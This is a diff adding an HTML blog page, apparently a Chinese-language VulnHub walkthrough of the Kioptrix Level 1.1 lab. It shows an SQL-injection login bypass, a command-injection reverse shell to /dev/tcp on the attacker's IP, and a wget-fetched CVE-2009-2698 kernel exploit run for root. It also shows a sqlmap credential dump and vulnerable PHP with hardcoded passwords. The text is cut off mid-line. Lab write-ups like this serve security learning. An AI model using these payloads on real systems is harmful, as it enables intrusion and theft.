@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kioptrix: Level 1.1">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/09/19/Kioptrix%20Level%201.1/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-09-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-10T13:49:27.235Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="Command Injection">
+<meta property="article:tag" content="信息收集、">
+<meta property="article:tag" content="SQL Injection">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/09/19/Kioptrix%20Level%201.1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/09/19/Kioptrix%20Level%201.1/","path":"2024/09/19/Kioptrix Level 1.1/","title":"Kioptrix: Level 1.1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kioptrix: Level 1.1 | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-%E6%B3%A8%E5%85%A5"><span class="nav-text">3.1. SQL 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-text">3.2. 提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">156</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/09/19/Kioptrix%20Level%201.1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kioptrix: Level 1.1 | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kioptrix: Level 1.1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-19 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-19T00:00:00+08:00">2024-09-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 21:49:27" itemprop="dateModified" datetime="2024-10-10T21:49:27+08:00">2024-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix:
+Level 1.1 (#2) ~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.1.133</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.1.133 -p-</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 21:02 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.133</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC <span class="comment">#100000)</span></span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">680/tcp  open  status   1 (RPC <span class="comment">#100024)</span></span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:8D:BA:40 (VMware)</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 需要登录</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191726485.jpg" /></p>
+<p>经测存在 SQL 注入，以 <code>admin' or '1</code> 即可成功登录</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191729537.jpg" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191729538.jpg" /></p>
+<p>推测可能存在命令注入漏洞</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>经测存在命令注入漏洞</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191733370.jpg" /></p>
+<p>读取源码看看</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191733371.jpg" /></p>
+<p>pingit.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<p>传入的参数未作任何过滤，拼接后利用 shell_exec() 函数执行了</p>
+<p>kali 开监听，反弹 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">223.5.5.5 | bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.184/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191811387.jpg" /></p>
+<p>获得 apache 权限 shell</p>
+<h3 id="提权">2.2. 提权</h3>
+<p>经测系统内核存在 CVE-2009-2698 漏洞，可用来提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL <span class="comment">#1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span></span><br><span class="line">bash-3.00$ </span><br><span class="line">bash-3.00$ <span class="built_in">cat</span> /etc/*-release</span><br><span class="line">CentOS release 4.5 (Final)</span><br><span class="line">bash-3.00$ </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191815340.jpg" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ <span class="built_in">pwd</span></span><br><span class="line">/tmp</span><br><span class="line">bash-3.00$ </span><br><span class="line">bash-3.00$ wget http://192.168.1.184:8000/9542.c</span><br><span class="line">--00:15:51--  http://192.168.1.184:8000/9542.c</span><br><span class="line">           =&gt; <span class="string">&#x27;9542.c&#x27;</span></span><br><span class="line">Connecting to 192.168.1.184:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,111 (3.0K) [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ...                                                   100%  211.92 MB/s</span><br><span class="line"></span><br><span class="line">00:15:51 (211.92 MB/s) - <span class="string">&#x27;9542.c&#x27;</span> saved [3111/3111]</span><br><span class="line"></span><br><span class="line">bash-3.00$ gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c</span><br><span class="line">gcc: 0x82-CVE-2009-2698.c: No such file or directory</span><br><span class="line">gcc: no input files</span><br><span class="line">bash-3.00$ gcc -o 0x82-CVE-2009-2698 9542.c</span><br><span class="line">bash-3.00$  </span><br><span class="line">bash-3.00$ ./0x82-CVE-2009-2698</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-3.00<span class="comment"># bash -i</span></span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-3.00<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=48(apache)</span><br></pre></td></tr></table></figure>
+<p>获得 root 权限</p>
+<h2 id="复盘">3. 复盘</h2>
+<h3 id="sql-注入">3.1. SQL 注入</h3>
+<p>登录存在 sql 注入，利用 sqlmap 读取数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt  --hex  -D webapp -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>
+<p>post.txt</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.133</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>37</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.133</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.133/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">uname</span><span class="operator">=</span>*<span class="variable">&amp;psw</span>=<span class="number">123456</span><span class="variable">&amp;</span>btnL<span class="attr">ogin</span><span class="operator">=</span>Login</span></span><br></pre></td></tr></table></figure>
+<p><strong>注</strong>，uname=*</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409191849847.jpg" /></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: webapp</span><br><span class="line">Table: users</span><br><span class="line"><span class="meta">[2 entries]</span></span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+----------+</span></span><br><span class="line"><span class="section">| id | password   | username |</span></span><br><span class="line"><span class="section">+----+------------+----------+</span></span><br><span class="line">| 1  | 5afac8d85f | admin    |</span><br><span class="line"><span class="section">| 2  | 66lajGGbla | john     |</span></span><br><span class="line"><span class="section">+----+------------+----------+</span></span><br></pre></td></tr></table></figure>
+<p>经测用户信息 SSH 登录不可用，尝试获取 <code>--os-shell</code>
+亦不可行</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;john&quot;</span>, <span class="string">&quot;hiroshima&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">        <span class="comment">//print &quot;Connected to MySQL&lt;br /&gt;&quot;;</span></span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;webapp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">                <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;psw&#x27;</span>];</span><br><span class="line">                <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">                <span class="comment">//print $query.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">                <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">                <span class="comment">//print &quot;ID: &quot;.$row[&#x27;id&#x27;].&quot;&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> name=<span class="string">&quot;frmLogin&quot;</span> id=<span class="string">&quot;frmLogin&quot;</span> action=<span class="string">&quot;index.php&quot;</span>&gt;</span><br><span class="line">        &lt;table width=<span class="string">&quot;300&quot;</span> border=<span class="string">&quot;1&quot;</span> align=<span class="string">&quot;center&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> cellspacing=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                        &lt;td colspan=<span class="string">&#x27;2&#x27;</span> align=<span class="string">&#x27;center&#x27;</span>&gt;</span><br><span class="line">                        &lt;b&gt;Remote System Administration Login&lt;/b&gt;</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                        &lt;td width=<span class="string">&quot;150&quot;</span>&gt;Username&lt;/td&gt;</span><br><span 